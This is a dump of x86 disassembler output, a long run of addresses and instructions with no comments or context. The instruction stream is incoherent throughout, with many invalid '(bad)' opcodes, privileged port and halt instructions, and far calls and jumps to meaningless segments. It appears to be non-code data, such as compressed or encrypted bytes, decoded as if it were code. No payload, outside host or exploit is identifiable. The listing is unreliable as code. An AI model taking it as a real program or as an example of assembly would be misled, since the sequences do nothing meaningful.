  409e84:	in     eax,0xd1
  409e86:	adc    bh,ah
  409e88:	sub    al,BYTE PTR [edx+0x77]
  409e8b:	fwait
  409e8c:	and    esi,esp
  409e8e:	retf   
  409e8f:	scas   eax,DWORD PTR es:[edi]
  409e90:	mov    BYTE PTR [edi-0xeb60afd],cl
  409e96:	mov    dh,0x35
  409e98:	and    eax,0x4ba43a15
  409e9d:	daa    
  409e9e:	push   ebp
  409e9f:	cmp    edx,DWORD PTR [edi-0x2a81e5a5]
  409ea5:	std    
  409ea6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ea7:	adc    cl,BYTE PTR [edi]
  409ea9:	xor    al,0xbe
  409eab:	shl    DWORD PTR [edi-0x1c9dff5],0xb8
  409eb2:	mov    ds:0x7bdcbb32,eax
  409eb7:	jb     0x409f09
  409eb9:	jbe    0x409e54
  409ebb:	pop    ebp
  409ebc:	cmc    
  409ebd:	(bad)  
  409ebe:	into   
  409ebf:	rcl    BYTE PTR fs:[eax+0x69],1
  409ec3:	push   esp
  409ec4:	adc    DWORD PTR [edi-0x1ecf51d8],ebx
  409eca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ecb:	cli    
  409ecc:	mov    bh,0x9c
  409ece:	lea    edi,[ebp+0x57]
  409ed1:	mov    WORD PTR [edi],cs
  409ed3:	push   edi
  409ed4:	mov    ebp,0xb244ae42
  409ed9:	mov    es,WORD PTR [esi]
  409edb:	js     0x409ecb
  409edd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ede:	pushf  
  409edf:	pusha  
  409ee0:	addr16 cwde 
  409ee2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ee3:	xchg   BYTE PTR [ebx],bl
  409ee5:	mov    ds:0xf6ff6411,eax
  409eea:	cmp    edx,ebp
  409eec:	lods   al,BYTE PTR ds:[esi]
  409eed:	mov    esp,0x65b3add8
  409ef2:	sbb    BYTE PTR [ebx+0x50d1cd32],0x70
  409ef9:	dec    DWORD PTR [esp+eiz*4-0x39]
  409efd:	retf   
  409efe:	push   eax
  409eff:	addr16 cmp eax,0xb5fc146b
  409f05:	mov    al,0x63
  409f07:	or     BYTE PTR [edi+0x26],dh
  409f0a:	xchg   ecx,eax
  409f0b:	pop    ecx
  409f0c:	call   0x4d3:0xb0429df1
  409f13:	mov    fs,WORD PTR [edi-0x1eb4e4e6]
  409f19:	cmp    DWORD PTR [ebp-0x55a9a2d5],esp
  409f1f:	push   0xdd28dc21
  409f24:	and    eax,0x61295acb
  409f29:	fdivr  DWORD PTR [ebp-0x2b]
  409f2c:	rol    DWORD PTR [ebp-0x4c],cl
  409f2f:	leave  
  409f30:	ja     0x409f4b
  409f32:	in     al,dx
  409f33:	push   edx
  409f34:	(bad)  [edx]
  409f36:	cld    
  409f37:	and    edi,ebx
  409f39:	repz fdivr QWORD PTR [ebx+0x2a]
  409f3d:	dec    eax
  409f3e:	jmp    0xef31961a
  409f43:	xchg   DWORD PTR [ebp-0x4bdb0147],edi
  409f49:	and    al,0x7f
  409f4b:	in     al,dx
  409f4c:	or     BYTE PTR [esi],al
  409f4e:	cmovp  ebx,DWORD PTR [eax-0x39]
  409f52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f53:	fwait
  409f54:	outs   dx,BYTE PTR ds:[esi]
  409f55:	xchg   ebx,eax
  409f56:	lds    ecx,FWORD PTR [edx]
  409f58:	test   eax,0xc944963e
  409f5d:	or     DWORD PTR [edx+edi*8],esi
  409f60:	xor    DWORD PTR [esi-0x54],ecx
  409f63:	adc    DWORD PTR [edi-0x63ca75ee],ebx
  409f69:	loope  0x409f37
  409f6b:	nop
  409f6c:	mov    dh,0x9e
  409f6e:	cmp    al,0xbe
  409f70:	mov    ah,0x34
  409f72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f73:	add    DWORD PTR [ebx],0x269e2646
  409f79:	sti    
  409f7a:	es adc al,0x81
  409f7d:	jbe    0x409f15
  409f7f:	jecxz  0x409fc1
  409f81:	cli    
  409f82:	bound  eax,QWORD PTR [ecx-0x3b]
  409f85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f86:	xchg   esi,eax
  409f87:	add    eax,0x9f6665d2
  409f8c:	adc    DWORD PTR [esi],edi
  409f8e:	xchg   BYTE PTR [edx+0x52],al
  409f91:	js     0x409faf
  409f93:	loope  0x409f6e
  409f95:	pop    ecx
  409f96:	in     al,dx
  409f97:	mov    bl,0x3d
  409f99:	dec    esi
  409f9a:	mov    ecx,0xbbf05b79
  409f9f:	jno    0x409f5a
  409fa1:	add    esp,DWORD PTR [ecx-0x66]
  409fa4:	adc    eax,0x44ebd586
  409fa9:	js     0x409fe6
  409fab:	sbb    ecx,DWORD PTR fs:[eax]
  409fae:	hlt    
  409faf:	add    eax,0xf47016a5
  409fb4:	leave  
  409fb5:	icebp  
  409fb6:	mov    WORD PTR [eax+0x63],?
  409fb9:	xchg   ebp,eax
  409fba:	fistp  WORD PTR [edi+0x63]
  409fbd:	push   edx
  409fbe:	ins    BYTE PTR es:[edi],dx
  409fbf:	popa   
  409fc0:	(bad)  
  409fc1:	les    esi,FWORD PTR [edi+0x6cb23f26]
  409fc7:	dec    ecx
  409fc8:	mov    al,BYTE PTR [edx+eiz*2+0x6]
  409fcc:	mov    ecx,0x6c0bb979
  409fd1:	scas   eax,DWORD PTR es:[edi]
  409fd2:	into   
  409fd3:	(bad)  
  409fd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409fd5:	repnz clc 
  409fd7:	mul    ah
  409fd9:	stos   DWORD PTR es:[edi],eax
  409fda:	or     BYTE PTR [edx],ah
  409fdc:	ins    DWORD PTR es:[edi],dx
  409fdd:	push   ecx
  409fde:	xor    eax,0x70b78010
  409fe3:	repz mov ebp,0x664186e6
  409fe9:	xor    DWORD PTR [edi+0x19],esi
  409fec:	daa    
  409fed:	sbb    BYTE PTR ds:0xd445e29f,bl
  409ff3:	repnz stc 
  409ff5:	dec    edx
  409ff7:	in     eax,0x5e
  409ff9:	cmp    bh,BYTE PTR [ebp+0xdc44f77]
  409fff:	inc    BYTE PTR [eax-0x25]
  40a002:	push   ss
  40a003:	xor    DWORD PTR [edx+0x4b],0xcf8aaf0a
  40a00a:	je     0x40a01c
  40a00c:	inc    edi
  40a00d:	mov    esp,0x3c54e739
  40a012:	adc    cl,ah
  40a014:	aam    0x68
  40a016:	frstor [ecx-0x25ff0983]
  40a01c:	xchg   edi,eax
  40a01d:	xor    DWORD PTR [edi+0x26],ecx
  40a020:	mov    cl,dh
  40a022:	rol    DWORD PTR [edi-0x60],cl
  40a025:	jno    0x40a018
  40a027:	aad    0x83
  40a029:	fdivr  DWORD PTR [eax]
  40a02b:	jne    0x409ffc
  40a02d:	iret   
  40a02e:	jp     0x409fe5
  40a030:	lock (bad) 
  40a032:	icebp  
  40a033:	aam    0xa4
  40a035:	cmp    esi,DWORD PTR gs:[esi]
  40a038:	xor    al,0x7e
  40a03a:	jae    0x40a038
  40a03c:	cld    
  40a03d:	push   ss
  40a03e:	cmp    eax,0xa63f3961
  40a043:	adc    al,0x50
  40a045:	adc    BYTE PTR [ecx-0x78d4e0f8],bh
  40a04b:	in     eax,0xac
  40a04d:	in     eax,0x51
  40a04f:	rcl    BYTE PTR [ebx+edi*2-0x7d],1
  40a053:	mov    eax,0x4d1bd140
  40a058:	jl     0x40a08c
  40a05a:	sub    dl,ah
  40a05c:	ins    DWORD PTR es:[edi],dx
  40a05d:	xchg   edi,eax
  40a05e:	cs stc 
  40a060:	xor    al,0x48
  40a062:	add    ecx,DWORD PTR [edx+0xd09355c]
  40a068:	fsubr  DWORD PTR [ebx]
  40a06a:	(bad)  
  40a06c:	sbb    DWORD PTR [ebx+eiz*8],0xffffff91
  40a070:	dec    esi
  40a071:	mov    esp,0x1519e13a
  40a076:	inc    eax
  40a077:	push   cs
  40a078:	mul    DWORD PTR [ebp-0xd]
  40a07b:	sub    eax,DWORD PTR [edi+0x7c]
  40a07e:	mov    esi,DWORD PTR [edi+0xf]
  40a081:	call   0x1bd7:0x9b73fc92
  40a088:	fidiv  DWORD PTR [edi+0x8]
  40a08b:	cwde   
  40a08c:	shl    edx,1
  40a08e:	add    eax,0xc0664478
  40a093:	popa   
  40a094:	dec    eax
  40a095:	dec    edi
  40a096:	jmp    0xee99971a
  40a09b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a09c:	rcl    dl,cl
  40a09e:	push   0xffffffb0
  40a0a0:	aam    0x5d
  40a0a2:	xchg   ecx,eax
  40a0a3:	pop    ebp
  40a0a4:	sbb    eax,0x28d582e9
  40a0a9:	(bad)  
  40a0aa:	cmp    edx,DWORD PTR [edi+0x24d9fcc6]
  40a0b0:	stos   BYTE PTR es:[edi],al
  40a0b1:	or     al,0x44
  40a0b3:	ficomp DWORD PTR [ebp-0x395ecbb5]
  40a0b9:	sub    al,0xf5
  40a0bb:	dec    edx
  40a0bc:	ror    DWORD PTR [edx-0x5c6ad68c],cl
  40a0c2:	ds pop di
  40a0c5:	lods   al,BYTE PTR ds:[esi]
  40a0c6:	mov    bh,0xbb
  40a0c8:	mov    BYTE PTR [edi],dl
  40a0ca:	xor    ebx,DWORD PTR [esi+0x25]
  40a0cd:	sbb    edi,esi
  40a0cf:	test   al,0xbe
  40a0d1:	jne    0x40a085
  40a0d3:	mov    esi,DWORD PTR [edi-0x6e417420]
  40a0d9:	adc    BYTE PTR [ebp+0x49],bl
  40a0dc:	retf   
  40a0dd:	je     0x40a109
  40a0df:	dec    ebx
  40a0e0:	push   ecx
  40a0e1:	das    
  40a0e2:	adc    BYTE PTR [esi],0xa1
  40a0e5:	imul   edi,DWORD PTR [esi],0x26
  40a0e8:	fstp   QWORD PTR [edi]
  40a0ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0eb:	cmp    BYTE PTR [edi-0x77],0xc4
  40a0ef:	push   edx
  40a0f0:	ror    esp,cl
  40a0f2:	pop    ds
  40a0f3:	push   esi
  40a0f4:	add    DWORD PTR [edx+edi*8+0x79644cca],eax
  40a0fb:	xor    eax,0x9a25f150
  40a100:	cmp    esp,ebx
  40a102:	mov    esi,0xa885800b
  40a107:	ret    
  40a108:	js     0x40a0da
  40a10a:	out    dx,al
  40a10b:	out    0xe7,eax
  40a10d:	xor    ecx,DWORD PTR [ecx]
  40a10f:	ins    DWORD PTR es:[edi],dx
  40a110:	xor    DWORD PTR [ebx],esi
  40a112:	pop    esi
  40a113:	and    al,0xb
  40a115:	cmp    DWORD PTR [ecx],esi
  40a117:	sti    
  40a118:	out    dx,al
  40a119:	iret   
  40a11a:	xchg   ebx,eax
  40a11b:	lea    esp,[edx]
  40a11d:	in     eax,dx
  40a11e:	mov    dl,0x4a
  40a120:	call   0x2e7a:0xb3e28ae7
  40a127:	cmc    
  40a128:	stos   BYTE PTR es:[edi],al
  40a129:	jns    0x40a1a8
  40a12b:	imul   esp,DWORD PTR ds:0x9f8576b6,0x5f3664b8
  40a135:	je     0x837fadac
  40a13b:	and    DWORD PTR [eax],ecx
  40a13d:	lods   eax,DWORD PTR ds:[esi]
  40a13e:	pop    edi
  40a13f:	cmp    eax,0xce884a2d
  40a144:	out    dx,al
  40a145:	mov    eax,0xd17bbe5e
  40a14a:	leave  
  40a14b:	adc    al,0x5c
  40a14d:	dec    edi
  40a14e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a14f:	fistp  DWORD PTR [edx]
  40a151:	dec    edx
  40a152:	loopne 0x40a166
  40a154:	adc    ecx,esp
  40a156:	imul   edi,DWORD PTR [esi+0x76],0x1f9e9a86
  40a15d:	and    ah,BYTE PTR [ebx+0x5af41a3d]
  40a163:	jp     0x40a150
  40a165:	inc    ebx
  40a166:	repnz pop ds
  40a168:	nop
  40a169:	rcr    DWORD PTR [edi],0x90
  40a16c:	ds push edx
  40a16e:	mov    al,ds:0xd79c0a55
  40a173:	xchg   edi,eax
  40a174:	popa   
  40a175:	or     ebx,DWORD PTR [ecx-0x20]
  40a178:	push   es
  40a179:	retf   
  40a17a:	and    eax,0xe09be38f
  40a17f:	mov    edx,0x6626213a
  40a184:	hlt    
  40a185:	push   eax
  40a186:	adc    al,0x6f
  40a188:	cmp    bl,BYTE PTR [esi-0x3f07a7ef]
  40a18e:	mov    al,0xf9
  40a190:	mov    ecx,0x87489cf2
  40a195:	stos   BYTE PTR es:[edi],al
  40a196:	retf   
  40a197:	sub    al,0x9a
  40a199:	cmp    BYTE PTR ds:0xcc3aa5e9,al
  40a19f:	retf   
  40a1a0:	add    dl,ah
  40a1a2:	mov    DWORD PTR [ebp-0x12],edx
  40a1a5:	xchg   DWORD PTR [ecx+esi*4-0x2b2342d0],eax
  40a1ac:	stos   BYTE PTR es:[edi],al
  40a1ad:	and    eax,0xefa18758
  40a1b2:	mov    esp,0x652628b6
  40a1b7:	jmp    0xb27fda1f
  40a1bc:	cmp    BYTE PTR [eax],al
  40a1be:	inc    eax
  40a1bf:	mov    cl,0xbe
  40a1c1:	ins    BYTE PTR es:[edi],dx
  40a1c2:	sbb    DWORD PTR [eax-0x61],ebx
  40a1c5:	stos   DWORD PTR es:[edi],eax
  40a1c6:	int    0x7e
  40a1c8:	in     eax,dx
  40a1c9:	gs jmp 0x130e:0xf4dac111
  40a1d1:	leave  
  40a1d2:	cmp    esp,DWORD PTR [ecx+0x1c]
  40a1d5:	pushf  
  40a1d6:	aaa    
  40a1d7:	pusha  
  40a1d8:	enter  0x129f,0x1e
  40a1dc:	test   al,0x1a
  40a1de:	hlt    
  40a1df:	and    edi,DWORD PTR [edi]
  40a1e1:	dec    ebx
  40a1e2:	or     edi,ecx
  40a1e4:	jmp    0x40a181
  40a1e6:	outs   dx,DWORD PTR ds:[esi]
  40a1e7:	xchg   edx,eax
  40a1e8:	jmp    0x863da19c
  40a1ed:	xor    DWORD PTR [edx],ebx
  40a1ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a1f0:	jo     0x40a223
  40a1f2:	mov    WORD PTR [eax-0x5d],es
  40a1f5:	sbb    al,0x8f
  40a1f7:	push   ecx
  40a1f8:	xchg   edx,eax
  40a1f9:	mov    dh,BYTE PTR [ebx+0x65]
  40a1fc:	add    BYTE PTR [eax-0x32],al
  40a1ff:	cli    
  40a200:	(bad)  
  40a201:	sti    
  40a202:	fs (bad) 
  40a205:	xchg   ebx,eax
  40a206:	xchg   BYTE PTR [edi+0x5d],dh
  40a209:	inc    ebx
  40a20a:	sbb    al,0xff
  40a20c:	inc    ebp
  40a20d:	pop    eax
  40a20e:	call   0xc800:0x329306be
  40a215:	es xor eax,ebx
  40a218:	ret    
  40a219:	inc    ebx
  40a21a:	xchg   ebx,eax
  40a21b:	sahf   
  40a21c:	mov    esp,0x63de10ad
  40a221:	js     0x40a258
  40a223:	mov    ebp,0xea0ef8c0
  40a228:	sub    BYTE PTR [eax-0x3d],0xde
  40a22c:	add    BYTE PTR [edx],cl
  40a22e:	ret    
  40a22f:	and    DWORD PTR [edi+0x5e276646],esp
  40a235:	sub    ch,al
  40a237:	xchg   ebp,eax
  40a238:	add    BYTE PTR [ebx-0xe],bl
  40a23b:	push   ebp
  40a23c:	mov    esi,0xf2bebf4f
  40a241:	mov    ch,0xa6
  40a243:	jecxz  0x40a2b6
  40a245:	fwait
  40a246:	mov    cl,0xdb
  40a248:	mov    al,ds:0xeaeddf7d
  40a24d:	mov    eax,ds:0xd37195a0
  40a252:	test   DWORD PTR [edx-0x71],ebx
  40a255:	rol    DWORD PTR [ecx],1
  40a257:	imul   DWORD PTR [ebp+0x76b4dbaa]
  40a25d:	call   0x104a:0x4a17cb19
  40a264:	clc    
  40a265:	mov    ah,0x20
  40a267:	cmp    DWORD PTR [esi],edx
  40a269:	retf   0x894a
  40a26c:	inc    ebx
  40a26d:	sub    eax,edx
  40a26f:	xchg   ecx,eax
  40a270:	out    0x1,eax
  40a272:	pop    ebp
  40a273:	aas    
  40a274:	retf   
  40a275:	cli    
  40a276:	ret    
  40a277:	in     al,dx
  40a278:	pop    edi
  40a279:	or     al,0x8e
  40a27b:	outs   dx,BYTE PTR ds:[esi]
  40a27c:	and    esi,DWORD PTR [ebp+0x191159b5]
  40a282:	dec    esi
  40a283:	aad    0x48
  40a285:	mov    ds:0x4ec0c0e0,al
  40a28a:	jmp    0x9a3eb017
  40a28f:	jnp    0x40a2d5
  40a291:	cdq    
  40a292:	xor    al,0x3
  40a294:	popf   
  40a295:	imul   edi,DWORD PTR [edx-0x55],0x96e4a7c0
  40a29c:	cli    
  40a29d:	mov    eax,0x3dd4c6f2
  40a2a2:	add    esp,esi
  40a2a4:	jg     0x40a2b2
  40a2a6:	cli    
  40a2a7:	jo     0x40a23a
  40a2a9:	js     0x40a249
  40a2ab:	lods   eax,DWORD PTR ds:[esi]
  40a2ac:	lahf   
  40a2ad:	fwait
  40a2ae:	mul    ah
  40a2b0:	hlt    
  40a2b1:	mov    ebp,0xb961a387
  40a2b6:	jb     0x40a315
  40a2b8:	(bad)  
  40a2b9:	pushf  
  40a2ba:	dec    ebp
  40a2bb:	nop
  40a2bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a2bd:	mov    ah,0xe6
  40a2bf:	dec    ecx
  40a2c0:	bound  eax,QWORD PTR [ecx+0x43d1eb6]
  40a2c6:	daa    
  40a2c7:	fsub   DWORD PTR [esi]
  40a2c9:	xchg   edi,eax
  40a2ca:	inc    edx
  40a2cb:	dec    bp
  40a2cd:	and    al,0x55
  40a2cf:	push   esi
  40a2d0:	xor    cl,0x34
  40a2d3:	je     0x40a25a
  40a2d5:	mov    al,0x6d
  40a2d7:	aaa    
  40a2d8:	outs   dx,DWORD PTR ds:[esi]
  40a2d9:	ffree  st(0)
  40a2db:	mov    esi,0x6412627a
  40a2e0:	sbb    BYTE PTR [ebx],ah
  40a2e2:	or     eax,0x5bbf8492
  40a2e7:	sub    BYTE PTR [esi],ah
  40a2e9:	mov    ah,0xfd
  40a2eb:	(bad)
  40a2ef:	add    DWORD PTR [ebx],0x71
  40a2f2:	std    
  40a2f3:	push   ebx
  40a2f4:	fs push ss
  40a2f6:	lods   eax,DWORD PTR ds:[esi]
  40a2f7:	push   eax
  40a2f8:	rcl    BYTE PTR ds:0xd441c5c7,1
  40a2fe:	add    al,0x66
  40a300:	int3   
  40a301:	bound  ecx,QWORD PTR [edi+0x40]
  40a304:	add    BYTE PTR [esi],0xc3
  40a307:	dec    ebx
  40a308:	mov    eax,0x127054ce
  40a30d:	sar    BYTE PTR [esi+edx*8],cl
  40a310:	lock sbb DWORD PTR [eax-0x42ad71bb],ebx
  40a317:	inc    esi
  40a318:	cmp    DWORD PTR [ebx-0x3d],ecx
  40a31b:	mov    esp,0x6646cfda
  40a320:	std    
  40a321:	iret   
  40a322:	fild   WORD PTR [ebx+0x60649d9a]
  40a328:	dec    ecx
  40a329:	fwait
  40a32a:	imul   edx,DWORD PTR [edi+0x70ff9f76],0xf87f5950
  40a334:	push   ds
  40a335:	jns    0x40a323
  40a337:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a338:	(bad)  
  40a339:	pusha  
  40a33a:	aam    0x57
  40a33c:	je     0x40a2f9
  40a33e:	fs aad 0xd8
  40a341:	adc    DWORD PTR [eax+0x61c40ba4],0x20
  40a348:	not    BYTE PTR [ecx]
  40a34a:	xchg   edx,eax
  40a34b:	outs   dx,DWORD PTR ds:[esi]
  40a34c:	pusha  
  40a34d:	ja     0x40a391
  40a34f:	xchg   ebp,eax
  40a350:	repnz (bad) 
  40a352:	test   eax,0x428df152
  40a357:	mov    bl,0xb4
  40a359:	test   eax,0x72bb7c47
  40a35e:	lods   al,BYTE PTR ds:[esi]
  40a35f:	xor    BYTE PTR [edx-0x52],cl
  40a362:	leave  
  40a363:	je     0x40a3d5
  40a365:	call   0x82d0:0xce8c3fe9
  40a36c:	and    bh,0x97
  40a36f:	adc    DWORD PTR [esi-0xb396d37],edx
  40a375:	dec    ebx
  40a376:	mov    ch,0xaa
  40a378:	push   DWORD PTR [esi]
  40a37a:	or     eax,DWORD PTR [edx+0x5ce21909]
  40a380:	shr    DWORD PTR [edi],1
  40a382:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a383:	inc    edi
  40a384:	test   al,0x7d
  40a386:	cmp    eax,0x5c5fc9b8
  40a38b:	jns    0x40a317
  40a38d:	out    dx,al
  40a38e:	hlt    
  40a38f:	mov    al,0xe3
  40a391:	mov    ah,0xb0
  40a393:	adc    ecx,DWORD PTR [esi+0x12]
  40a396:	lock aaa 
  40a398:	dec    eax
  40a399:	aas    
  40a39a:	in     al,dx
  40a39b:	dec    edi
  40a39c:	xchg   ch,bl
  40a39e:	fistp  WORD PTR [ebp-0x4c]
  40a3a1:	mov    dh,0x91
  40a3a3:	mov    edi,0x2dce4e7d
  40a3a8:	ss push es
  40a3aa:	fild   DWORD PTR [esi]
  40a3ac:	inc    eax
  40a3ad:	mov    al,ds:0xaaffeb3e
  40a3b2:	add    DWORD PTR [esi],0xbb2772e0
  40a3b8:	aas    
  40a3b9:	out    0xdb,eax
  40a3bb:	js     0x40a364
  40a3bd:	je     0x40a345
  40a3bf:	mov    al,ds:0x287793ec
  40a3c4:	xor    al,0x9
  40a3c6:	imul   BYTE PTR [eax+0x3]
  40a3c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a3ca:	clc    
  40a3cb:	stos   DWORD PTR es:[edi],eax
  40a3cc:	shl    BYTE PTR [edx+0x184aaf44],0xc
  40a3d3:	mov    esp,0x9df9ec1b
  40a3d8:	add    eax,0x6d70eb16
  40a3dd:	pop    ss
  40a3de:	aas    
  40a3df:	int3   
  40a3e0:	pop    ss
  40a3e1:	mov    ch,0x78
  40a3e3:	lahf   
  40a3e4:	scas   eax,DWORD PTR es:[edi]
  40a3e5:	retf   0x2319
  40a3e8:	call   0x8a2164db
  40a3ed:	xor    dh,ah
  40a3ef:	dec    ebp
  40a3f0:	fst    QWORD PTR [ebp-0x6e9bd8c9]
  40a3f6:	xlat   BYTE PTR ds:[ebx]
  40a3f7:	fwait
  40a3f8:	out    dx,al
  40a3f9:	dec    ecx
  40a3fa:	(bad)  
  40a3fb:	outs   dx,BYTE PTR ds:[esi]
  40a3fc:	gs fcos 
  40a3ff:	call   0xfdf0:0xf0c2feb9
  40a406:	fs in  eax,0xd9
  40a409:	or     bl,BYTE PTR [bx+si+0x67]
  40a40d:	jl     0x40a3d4
  40a40f:	dec    ebp
  40a410:	dec    ebx
  40a411:	ret    
  40a412:	fnsave [ebx+0x6e]
  40a415:	sub    al,0xf2
  40a417:	stc    
  40a418:	dec    edi
  40a419:	ficomp WORD PTR [ebx-0x6d48bdd1]
  40a41f:	add    al,al
  40a421:	push   0x93c753d3
  40a426:	pop    esp
  40a427:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a428:	ins    BYTE PTR es:[edi],dx
  40a429:	lock jmp 0x40a3b8
  40a42c:	cmp    bh,ch
  40a42e:	push   edx
  40a42f:	lahf   
  40a430:	test   eax,0xd33ad452
  40a435:	adc    BYTE PTR [ebx],dh
  40a437:	or     eax,0xc8555195
  40a43c:	dec    ebx
  40a43d:	mov    edx,0x921dce0c
  40a442:	fstp   DWORD PTR [eax-0x14]
  40a445:	mov    dh,0xcb
  40a447:	js     0x40a43a
  40a449:	adc    eax,0xf1a1df12
  40a44e:	jo     0x40a485
  40a450:	hlt    
  40a451:	mov    ds:0x18d7adca,eax
  40a456:	mov    eax,ds:0x55e93e01
  40a45b:	ins    BYTE PTR es:[edi],dx
  40a45c:	xor    al,0x24
  40a45e:	sbb    al,dh
  40a460:	inc    ecx
  40a461:	rol    BYTE PTR [edx],cl
  40a463:	lea    esi,[ecx+0x68]
  40a466:	and    cl,bl
  40a468:	addr16 fcmovne st,st(4)
  40a46b:	jl     0x40a43d
  40a46d:	push   0x5e
  40a46f:	pop    es
  40a470:	inc    ebx
  40a471:	sbb    ah,ah
  40a473:	sbb    ecx,DWORD PTR [ecx-0x1798c337]
  40a479:	mov    edx,0x87aa1b2e
  40a47e:	cmp    ecx,edx
  40a480:	push   ebx
  40a481:	test   BYTE PTR [ecx],dh
  40a483:	mov    esi,0x5fd8117d
  40a488:	mov    edi,ebp
  40a48a:	xchg   ebp,eax
  40a48b:	push   ds
  40a48c:	pop    ebp
  40a48d:	cmp    al,0x20
  40a48f:	mov    BYTE PTR [edx-0x25167b0d],al
	...
  40a511:	add    BYTE PTR [eax],al
  40a513:	add    BYTE PTR ds:0x96f91681,dl
  40a519:	(bad)  
  40a51a:	(bad)  
  40a51b:	in     eax,dx
  40a51c:	push   eax
  40a51d:	scas   eax,DWORD PTR es:[edi]
  40a51e:	(bad)  
  40a51f:	jp     0x40a4a4
  40a521:	xchg   esi,eax
  40a522:	call   0x97f483
  40a527:	add    BYTE PTR [ecx+0x7],ch
  40a52a:	add    BYTE PTR [eax],al
  40a52c:	mov    ebp,DWORD PTR [ebx]
  40a52e:	lods   al,BYTE PTR ds:[esi]
  40a52f:	sbb    bl,dh
  40a531:	xacquire lock sbb DWORD PTR [ebx],0x2c840e15
  40a539:	adc    eax,0x2425e101
  40a53e:	das    
  40a53f:	xchg   ebp,eax
  40a540:	xchg   esp,eax
  40a541:	arpl   WORD PTR [esi],ax
  40a543:	not    DWORD PTR [ebx+0x4fa57fb5]
  40a549:	cs mov esp,0x9fcf6c0c
  40a54f:	into   
  40a550:	cmp    cl,BYTE PTR [esi]
  40a552:	cmp    DWORD PTR [esi],esi
  40a554:	or     ebx,DWORD PTR [ebp+esi*4-0xa]
  40a558:	jmp    0x4c9d:0x8a195e21
  40a55f:	xor    al,0xce
  40a561:	rol    BYTE PTR [esi-0x36d7fbd1],cl
  40a567:	stos   BYTE PTR es:[edi],al
  40a568:	xchg   DWORD PTR [eax],ebx
  40a56a:	xchg   DWORD PTR [esi+0x72228232],ebp
  40a570:	cli    
  40a571:	jb     0x40a51f
  40a573:	pop    esp
  40a574:	push   ebp
  40a575:	push   es
  40a576:	fwait
  40a577:	xor    ah,BYTE PTR [edi+0x37595fa9]
  40a57d:	cwde   
  40a57e:	jp     0x40a5ef
  40a580:	ret    0x7cea
  40a583:	jmp    0xaaab:0x51879161
  40a58a:	xchg   esp,eax
  40a58b:	xchg   ebx,eax
  40a58c:	inc    eax
  40a58d:	daa    
  40a58e:	dec    ebx
  40a58f:	call   0x79ed:0xf1764a34
  40a596:	adc    eax,DWORD PTR [ebx]
  40a598:	and    al,0x44
  40a59a:	sbb    al,0xe9
  40a59c:	sub    DWORD PTR [esi],0xffffffc1
  40a59f:	xlat   BYTE PTR ds:[ebx]
  40a5a0:	cmc    
  40a5a1:	mov    ch,0x50
  40a5a3:	out    0x83,al
  40a5a5:	test   DWORD PTR [ecx+ebp*2-0x1d],ebp
  40a5a9:	push   ebx
  40a5aa:	lahf   
  40a5ab:	jg     0x40a578
  40a5ad:	dec    DWORD PTR [ebx]
  40a5af:	jmp    0x8a835b7e
  40a5b4:	mov    bl,0x74
  40a5b6:	mov    BYTE PTR [ebp+0x34],ch
  40a5b9:	xchg   edx,eax
  40a5ba:	sbb    edi,ecx
  40a5bc:	test   BYTE PTR [edx],ah
  40a5be:	mov    es,WORD PTR [ebp+0x47aecfa9]
  40a5c4:	pop    ebx
  40a5c5:	int    0x2a
  40a5c7:	lods   al,BYTE PTR ds:[esi]
  40a5c8:	xor    BYTE PTR [eax+ebx*1],dh
  40a5cb:	ins    BYTE PTR es:[edi],dx
  40a5cc:	adc    eax,0x5c394819
  40a5d1:	fidiv  DWORD PTR [edx+0x4edd1cdc]
  40a5d7:	jns    0x40a56d
  40a5d9:	scas   eax,DWORD PTR es:[edi]
  40a5da:	jge    0x40a584
  40a5dc:	sbb    dh,BYTE PTR [ecx+0x2e1c5a55]
  40a5e2:	xor    edi,ebx
  40a5e4:	adc    eax,eax
  40a5e6:	stc    
  40a5e7:	into   
  40a5e8:	jns    0x40a5c2
  40a5ea:	add    bl,bh
  40a5ec:	mov    ebp,0x523c85d5
  40a5f1:	fcom   DWORD PTR [ebp+ebp*8+0x61680050]
  40a5f8:	and    al,0xfe
  40a5fa:	inc    esi
  40a5fb:	jmp    0x40a5e9
  40a5fd:	les    eax,FWORD PTR [eax-0x2817acb6]
  40a603:	pop    esi
  40a604:	in     eax,dx
  40a605:	mov    ds:0x552ebdb9,al
  40a60a:	push   ecx
  40a60b:	ror    BYTE PTR fs:[eax],0x77
  40a60f:	adc    eax,0xa687f744
  40a614:	nop
  40a615:	out    dx,al
  40a616:	sbb    edx,edi
  40a618:	xor    esi,0xbaf3091e
  40a61e:	jns    0x40a65b
  40a620:	add    eax,0xf8548f
  40a625:	je     0x40a64a
  40a627:	clc    
  40a628:	fist   WORD PTR ds:0xf3438e1e
  40a62e:	add    BYTE PTR gs:[ebx+0x4f],cl
  40a632:	inc    ebp
  40a633:	ds cs pop ebp
  40a636:	xlat   BYTE PTR ds:[ebx]
  40a637:	fs je  0x40a634
  40a63a:	inc    esi
  40a63b:	mov    al,BYTE PTR [esi]
  40a63d:	cmp    edx,ecx
  40a63f:	dec    esi
  40a640:	ror    BYTE PTR [ebp+0x3c],cl
  40a643:	es sbb edi,eax
  40a646:	or     al,0x54
  40a648:	pusha  
  40a649:	int3   
  40a64a:	xor    bh,al
  40a64c:	jge    0x40a620
  40a64e:	inc    ecx
  40a64f:	jae    0x40a6cb
  40a651:	clc    
  40a652:	gs pop ebx
  40a654:	pop    ds
  40a655:	xlat   BYTE PTR ds:[ebx]
  40a656:	(bad)  
